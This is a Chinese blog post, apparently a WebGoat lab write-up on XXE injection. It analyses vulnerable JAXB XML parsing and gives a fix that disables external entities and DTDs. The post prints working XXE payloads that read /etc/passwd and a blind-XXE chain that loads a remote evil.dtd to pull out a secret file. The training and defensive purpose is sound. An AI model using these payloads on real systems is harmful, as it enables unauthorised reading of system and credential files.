@@ -1,0 +1,849 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="且将新火试新茶，诗酒趁年华">
+    <meta name="author" content="Drunkbaby">
+    
+    <title>
+        
+            WebGoat代码审计-05-XXE注入 |
+        
+        Drunkbaby&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="https://github.com/Drun1baby/CVE_Pentest/blob/main/%E5%8F%8B%E9%93%BEimages/favicon.png">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/fontawesome.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/regular.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/solid.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/brands.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"drun1baby.github.io","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true},"style":{"primary_color":"#0066cc","logo":"https://raw.githubusercontent.com/Drun1baby/CVE_Pentest/main/%E5%8F%8B%E9%93%BEimages/logo.png","favicon":"https://github.com/Drun1baby/CVE_Pentest/blob/main/%E5%8F%8B%E9%93%BEimages/favicon.png","avatar":"/images/avatar.svg","font_size":"16px","font_family":null,"hover":{"shadow":true,"scale":true},"first_screen":{"enable":true,"header_transparent":true,"background_img":"/images/bg.svg","description":"且将新火试新茶，诗酒趁年华","font_color":null,"hitokoto":false},"scroll":{"progress_bar":true,"percent":false}},"local_search":{"enable":true,"preload":true},"code_copy":{},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"default"},"side_tools":{},"pjax":{"enable":true},"lazyload":{"enable":false},"comment":{"enable":true,"use":"valine","valine":{"enable":true,"appid":"mCIu9X4iLP3I0GikUoetB9bV-9Nh9j0Va","appkey":"ermlV1eoB1YODT088EdXjo6C","placeholder":"just go go","background":"/images/comment_bg.png","count":true},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.8"},"waline":{"server_url":null,"reaction":false,"version":2}},"post":{"author_label":{"enable":true,"auto":true,"custom_label_list":["Trainee","Engineer","Architect"]},"word_count":{"enable":true,"wordcount":true,"min2read":true},"img_align":"left","copyright_info":true},"version":"3.6.1"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="https://raw.githubusercontent.com/Drun1baby/CVE_Pentest/main/%E5%8F%8B%E9%93%BEimages/logo.png">
+                </a>
+            
+            <a class="logo-title" href="/">
+               Drunkbaby&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                标签
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                分类
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/links"
+                            >
+                                友链
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                关于
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">标签</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">分类</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/links">友链</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">关于</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container">
+        <div class="article-content-container">
+
+            <div class="article-title">
+                <span class="title-hover-animation">WebGoat代码审计-05-XXE注入</span>
+            </div>
+
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="/images/avatar.svg">
+                    </div>
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">Drunkbaby</span>
+                            
+                                <span class="author-label">Lv6</span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            
+<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        
+            <i class="fa-regular fa-calendar-plus"></i>&nbsp;
+        
+        <span class="pc">2022-04-18 16:22:04</span>
+        <span class="mobile">2022-04-18 16:22</span>
+    </span>
+    
+        <span class="article-update-date article-meta-item">
+        <i class="fas fa-file-pen"></i>&nbsp;
+        <span class="pc">2022-09-18 17:58:10</span>
+    </span>
+    
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>1.4k 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>6 分钟</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                        </div>
+                    </div>
+                </div>
+            
+
+            <div class="article-content keep-markdown-body">
+                
+
+                <h1 id="WebGoat-代码审计-05-XXE注入"><a href="#WebGoat-代码审计-05-XXE注入" class="headerlink" title="WebGoat 代码审计-05-XXE注入"></a>WebGoat 代码审计-05-XXE注入</h1><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>本篇文章只针对 WebGoat 下的 XXE 进行学习，需要进一步深入学习可以移步至我博客学习</p>
+<p>之前刷 Port 的时候，XXE 算是自己比较薄弱的一块，现在刷 Webgoat 的话要更加专注一些。</p>
+<h2 id="0x02-靶场"><a href="#0x02-靶场" class="headerlink" title="0x02 靶场"></a>0x02 靶场</h2><h3 id="1-提一嘴的-PageLesson3"><a href="#1-提一嘴的-PageLesson3" class="headerlink" title="1. 提一嘴的 PageLesson3"></a>1. 提一嘴的 PageLesson3</h3><p>可以去看一眼，理解一下 DTD。而且这一页给我们提供了一个 XXE 例子。</p>
+<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span>
+<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">author</span> <span class="token punctuation">[</span><span class="token internal-subset">
+  &lt;!ENTITY js SYSTEM "file:///etc/passwd">
+</span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>author</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&js;">&amp;js;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>author</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<img src="/2022/04/18/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-05-XXE%E6%B3%A8%E5%85%A5/etc_password.png" class="">
+
+<h3 id="2-XXE-PageLesson4-利用-file-协议读出敏感数据"><a href="#2-XXE-PageLesson4-利用-file-协议读出敏感数据" class="headerlink" title="2. XXE PageLesson4 利用 file 协议读出敏感数据"></a>2. XXE PageLesson4 利用 file 协议读出敏感数据</h3><ul>
+<li>靶场题意：让我们通过对 index 下的图片添加评论，从而触发 XXE，导致列出文件系统的根目录。</li>
+</ul>
+<h4 id="题目部分"><a href="#题目部分" class="headerlink" title="题目部分"></a>题目部分</h4><p>靶场如图所示</p>
+<img src="/2022/04/18/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-05-XXE%E6%B3%A8%E5%85%A5/FileIndex.png" class="">
+
+<p>我们在评论区内输入 123，并用 Burpsuite 抓包。抓包之后发现，请求的地址是 &#x2F;WebGoat&#x2F;xxe&#x2F;simple，POST 请求的正文是一个标准格式的 XML。</p>
+<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>comment</span><span class="token punctuation">></span></span>  
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>text</span><span class="token punctuation">></span></span>123<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>text</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>comment</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<img src="/2022/04/18/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-05-XXE%E6%B3%A8%E5%85%A5/FileXXE.png" class="">
+
+<p>既然这边的 XML 可以通过用户的输入进行自定义，所以我们构造如下的 payload：</p>
+<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version='1.0'?></span>
+<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">any</span><span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY test SYSTEM "file:///etc/passwd"></span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>comment</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>text</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&test;">&amp;test;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>text</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>comment</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<img src="/2022/04/18/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-05-XXE%E6%B3%A8%E5%85%A5/SuccessFileXXE.png" class="">
+
+<p>在JAVA中，file:&#x2F;&#x2F;协议不仅可以读取文件，还可以列目录。</p>
+<img src="/2022/04/18/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-05-XXE%E6%B3%A8%E5%85%A5/SuccessFileXXE2.png" class="">
+<h4 id="源码部分"><a href="#源码部分" class="headerlink" title="源码部分"></a>源码部分</h4><p>前文我们说了，发包的时候请求的地址是 &#x2F;WebGoat&#x2F;XXE&#x2F;SimpleXXE，我们去翻这个源文件。</p>
+<img src="/2022/04/18/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-05-XXE%E6%B3%A8%E5%85%A5/FileXXECode.png" class="">
+
+<p>最让人想看到的 <code>return success(this).build()</code> 在第 73 - 75 行。</p>
+<ul>
+<li>静下心来代码审计一下</li>
+</ul>
+<p>首先是第 68 行 与 第 71 - 72 行：<br>第 68 行将 POST 请求中的 Body(正文) 中的内容赋值给 commentStr 这个字符串对象；<br>第 71 - 72 行，将commentStr交给comments实例的parseXml方法来处理。并赋给Comment类的comment实例，说明经过parseXml方法处理后的类型为comment，最后comments.addComment(comment, false);来添加评论。</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">var</span> comment <span class="token operator">=</span> comments<span class="token punctuation">.</span><span class="token function">parseXml</span><span class="token punctuation">(</span>commentStr<span class="token punctuation">)</span><span class="token punctuation">;</span>  
+comments<span class="token punctuation">.</span><span class="token function">addComment</span><span class="token punctuation">(</span>comment<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>跳转到 <code>Comments.parseXml</code> 去，主要描述了 parseXml 如何处理 commentStr。</p>
+<img src="/2022/04/18/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-05-XXE%E6%B3%A8%E5%85%A5/FileXXECommentCode.png" class="">
+
+<p>第 93 - 94 行单独拉出来讲</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">var</span> jc <span class="token operator">=</span> <span class="token class-name">JAXBContext</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token class-name">Comment</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+<span class="token keyword">var</span> xif <span class="token operator">=</span> <span class="token class-name">XMLInputFactory</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>主要关注 JAXB</p>
+<blockquote>
+<p>JAXBContext</p>
+</blockquote>
+<ul>
+<li>前置知识：JAXB 作为 JDK 的一部分，能便捷地将 Java 对象与 XML 进行相互转换。</li>
+<li><code>JAXBContext</code> 是整个 JAXB API 的入口。主要用来构建 JAXB 实例<code>newInstance()</code>。</li>
+<li>Marshaller接口，将Java对象序列化为XML数据。 </li>
+<li>Unmarshaller接口，将XML数据反序列化为Java对象。</li>
+</ul>
+<p>JAXBContext.newInstance(Comment.class) 的作用是将 Comment 这个对象进行注册，创建一个 JAXB 实例；实例名字在本代码中为 jc。</p>
+<p>Comment 对象如图所示</p>
+<img src="/2022/04/18/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-05-XXE%E6%B3%A8%E5%85%A5/CommentCode.png" class="">
+
+
+<blockquote>
+<h5 id="接下来要讲的是产生-XXE-的代码块原因"><a href="#接下来要讲的是产生-XXE-的代码块原因" class="headerlink" title="接下来要讲的是产生 XXE 的代码块原因"></a><strong>接下来要讲的是产生 XXE 的代码块原因</strong></h5></blockquote>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">var</span> unmarshaller <span class="token operator">=</span> jc<span class="token punctuation">.</span><span class="token function">createUnmarshaller</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+<span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token class-name">Comment</span><span class="token punctuation">)</span> unmarshaller<span class="token punctuation">.</span><span class="token function">unmarshal</span><span class="token punctuation">(</span>xsr<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>此处创建一个 Unmarshaller 对象。返回的值是 XML 经过unmarshal 方法处理的值。由于 unmarshal 在执行过程中解析了 XML(这里类似于反序列化的意思)，导致 XXE 注入。</p>
+<p><strong>当把 XML 格式的字符串传递给 Unmarshaller 接口转变成 Java 对象时，会解析一遍 XML，如果传入的值可控就会导致 XXE 注入攻击。</strong></p>
+<h4 id="修复手段"><a href="#修复手段" class="headerlink" title="修复手段"></a>修复手段</h4><p>前文说到产生 XXE 注入是因为解析 XML 时不加任何的限制，那么我们的修复手段讲将支持外部实体和支持dtd都给禁止便可。</p>
+<ul>
+<li>借用木爷的代码</li>
+</ul>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> XXE<span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> <span class="token namespace">lombok<span class="token punctuation">.</span>var</span><span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>bind<span class="token punctuation">.</span></span><span class="token class-name">JAXBContext</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>bind<span class="token punctuation">.</span></span><span class="token class-name">JAXBException</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>stream<span class="token punctuation">.</span></span><span class="token class-name">XMLInputFactory</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>stream<span class="token punctuation">.</span></span><span class="token class-name">XMLStreamException</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">StringReader</span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">XXERepair</span> <span class="token punctuation">&#123;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token class-name">Repair</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">JAXBException</span><span class="token punctuation">,</span> <span class="token class-name">XMLStreamException</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">String</span> xml <span class="token operator">=</span> <span class="token string">"&lt;?xml version=\"1.0\"?>\n"</span> <span class="token operator">+</span>
+                <span class="token string">"&lt;!DOCTYPE doc [ \n"</span> <span class="token operator">+</span>
+                <span class="token string">"&lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n"</span> <span class="token operator">+</span>
+                <span class="token string">"]>&lt;comment>&lt;text>&amp;xxe;&lt;/text>&lt;/comment>"</span><span class="token punctuation">;</span>
+        <span class="token keyword">var</span> jc <span class="token operator">=</span> <span class="token class-name">JAXBContext</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token class-name">Comment</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment">// 创建了我们的工厂 读取xml的一个工厂</span>
+        <span class="token keyword">var</span> xif <span class="token operator">=</span> <span class="token class-name">XMLInputFactory</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment">// 不支持外部实体</span>
+       <span class="token comment">// 后面两行是多加的代码 </span>
+        xif<span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span><span class="token class-name">XMLInputFactory</span><span class="token punctuation">.</span>IS_SUPPORTING_EXTERNAL_ENTITIES<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment">// 不支持dtd</span>
+        xif<span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span><span class="token class-name">XMLInputFactory</span><span class="token punctuation">.</span>SUPPORT_DTD<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">var</span> xsr <span class="token operator">=</span> xif<span class="token punctuation">.</span><span class="token function">createXMLStreamReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringReader</span><span class="token punctuation">(</span>xml<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment">// 将我们的xml 变成我们的java对象</span>
+        <span class="token keyword">var</span> unmarshaller <span class="token operator">=</span> jc<span class="token punctuation">.</span><span class="token function">createUnmarshaller</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        unmarshaller<span class="token punctuation">.</span><span class="token function">unmarshal</span><span class="token punctuation">(</span>xsr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token punctuation">&#125;</span>
+
+
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">JAXBException</span><span class="token punctuation">,</span> <span class="token class-name">XMLStreamException</span> <span class="token punctuation">&#123;</span>
+
+        <span class="token class-name">XXERepair</span> test <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XXERepair</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name"><span class="token namespace">test<span class="token punctuation">.</span></span>Repair</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Comment 类</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> XXE<span class="token punctuation">;</span>
+
+
+<span class="token keyword">import</span> <span class="token namespace">lombok<span class="token punctuation">.</span></span><span class="token class-name">AllArgsConstructor</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">lombok<span class="token punctuation">.</span></span><span class="token class-name">Getter</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">lombok<span class="token punctuation">.</span></span><span class="token class-name">NoArgsConstructor</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">lombok<span class="token punctuation">.</span></span><span class="token class-name">Setter</span><span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">XmlRootElement</span><span class="token punctuation">;</span>
+
+<span class="token annotation punctuation">@Getter</span>
+<span class="token annotation punctuation">@Setter</span>
+<span class="token annotation punctuation">@AllArgsConstructor</span>
+<span class="token annotation punctuation">@NoArgsConstructor</span>
+<span class="token annotation punctuation">@XmlRootElement</span>
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Comment</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">private</span> <span class="token class-name">String</span> user<span class="token punctuation">;</span>
+    <span class="token keyword">private</span> <span class="token class-name">String</span> dateTime<span class="token punctuation">;</span>
+    <span class="token keyword">private</span> <span class="token class-name">String</span> text<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<h3 id="3-XXE-PageLesson7-改变Content-Type利用-file-协议读出敏感数据"><a href="#3-XXE-PageLesson7-改变Content-Type利用-file-协议读出敏感数据" class="headerlink" title="3. XXE PageLesson7 改变Content-Type利用 file 协议读出敏感数据"></a>3. XXE PageLesson7 改变Content-Type利用 file 协议读出敏感数据</h3><ul>
+<li>题意：发包的 Body 修改成了 json 的格式，看上去不存在 XXE 了</li>
+</ul>
+<h4 id="题目部分-1"><a href="#题目部分-1" class="headerlink" title="题目部分"></a>题目部分</h4><p>靶场和上一题长得一模一样，甚至上一题渗透的痕迹还在。</p>
+<img src="/2022/04/18/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-05-XXE%E6%B3%A8%E5%85%A5/ContenTypeIndex.png" class="">
+
+<p>抓个包，查看一下；发现是 Content-Type 变为 json</p>
+<img src="/2022/04/18/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-05-XXE%E6%B3%A8%E5%85%A5/ContenTypeBag.png" class="">
+
+<p>尝试修改 Content-Type 为 application&#x2F;xml 再发包，并使用上一题的 payload</p>
+<img src="/2022/04/18/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-05-XXE%E6%B3%A8%E5%85%A5/ContenTypeSolved.png" class="">
+
+<h4 id="源码部分-1"><a href="#源码部分-1" class="headerlink" title="源码部分"></a>源码部分</h4><p>ContentTypeAssignment.java 文件下的 xxe&#x2F;content-type 接口。</p>
+<img src="/2022/04/18/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-05-XXE%E6%B3%A8%E5%85%A5/ContenTypeCode.png" class="">
+
+
+<p>源码部分，并没有对 Content-Type 进行严格的过滤。</p>
+<h4 id="修复部分"><a href="#修复部分" class="headerlink" title="修复部分"></a>修复部分</h4><p>修复的话，应该从根源上解决，即和上题一致。</p>
+<h3 id="4-XXE-PageLesson10-盲注"><a href="#4-XXE-PageLesson10-盲注" class="headerlink" title="4. XXE PageLesson10 盲注"></a>4. XXE PageLesson10 盲注</h3><ul>
+<li>题意：获取 WebGoat 下的 secret.txt 文件</li>
+</ul>
+<h4 id="题目部分-2"><a href="#题目部分-2" class="headerlink" title="题目部分"></a>题目部分</h4><p>按照多重 DTD 的思路继续，这里的方式比较常规，但是还是会给人带来一些疙瘩。</p>
+<ul>
+<li>首先是上传一个恶意的 DTD 到第三方服务器，这个恶意 DTD 我们暂且将其命名为 evil.dtd</li>
+</ul>
+<p><strong>evil.dtd</strong></p>
+<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
+&lt;!ENTITY secret SYSTEM 'file://用 WebGoat 给的路径替换进来'><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>上传之后，抓包，并构造 payload</p>
+<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span>
+<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">convert</span> <span class="token punctuation">[</span><span class="token internal-subset"> 
+&lt;!ENTITY % remote SYSTEM "http://localhost:9090/files/admin1123这里是自己的username/evil.dtd">
+%remote;
+</span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>comment</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>text</span><span class="token punctuation">></span></span>123 <span class="token entity named-entity" title="&secret;">&amp;secret;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>text</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>comment</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>在 Burpsuite 中发包，接着刷新再输入即可。</p>
+<img src="/2022/04/18/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-05-XXE%E6%B3%A8%E5%85%A5/Solved.png" class="">
+
+<h4 id="源码部分-2"><a href="#源码部分-2" class="headerlink" title="源码部分"></a>源码部分</h4><ul>
+<li>源码层面和之前是一样的，只是没有回显的消息了，我这里把有回显与无回显的都贴出来对比一下。</li>
+</ul>
